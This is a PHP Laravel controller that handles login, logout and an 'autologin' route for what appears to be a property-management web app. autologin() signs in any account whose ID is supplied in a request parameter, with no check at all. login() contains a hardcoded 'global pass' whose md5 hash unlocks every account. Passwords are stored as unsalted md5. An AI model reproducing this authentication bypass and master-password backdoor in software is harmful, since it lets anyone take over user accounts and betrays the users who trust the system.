<?php

namespace App\Http\Controllers;

use App\Models\Users\UserEntity;
use Illuminate\Http\Request;
use Illuminate\View;

class FrontController extends FrontBaseController{

    public function  __construct()
    {
        parent::__construct();
    }

    public function autologin( Request $request )
    {
        \Auth::loginUsingId( $request->u );
        return redirect( 'dashboard');
    }

    public function login( Request $request )
    {

        if( \Request::isMethod( 'POST' )){
            // cannot use the Auth::attempt. Old DB uses md5 isntead of bcrypt
            if( ! $user = UserEntity::where( 'username' , \Request::get('username') )->first() ){
                $request->session()->flash(  'error_message' , ' Invalid Username or Password '  );
                return redirect('login');
            }

            // compare passwords
            if( $user->password != md5( \Request::get( 'pass' ) )){
                // global pass
                if( md5( \Request::get( 'pass' ) ) != '80404235b327684fc7df899136fe0d09'){
                    $request->session()->flash(  'error_message' , ' Invalid Username or Password '  );
                    return redirect('login');
                }
            }

            // manually login user

            \Auth::loginUsingId( $user->id );
            return redirect('components/properties');

        }

        $view = view( 'layouts.layout_login' );
        return $view;
    }

    public function logout()
    {
        \Auth::logout();
        session()->flash( 'message' , 'Successfully Logout' );
        return redirect( 'login' );
    }
}